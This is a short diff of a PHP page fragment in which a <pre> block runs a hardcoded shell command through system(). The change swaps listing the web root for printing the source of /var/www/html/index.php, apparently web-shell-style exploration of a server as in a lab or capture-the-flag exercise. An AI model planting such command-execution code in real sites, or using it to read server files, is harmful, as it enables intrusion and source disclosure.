@@ -8,7 +8,7 @@
 </form>
 <pre>
 <?php
-        echo system('ls /var/www/html');
+        echo system('cat /var/www/html/index.php');
     
 ?>
 </pre>
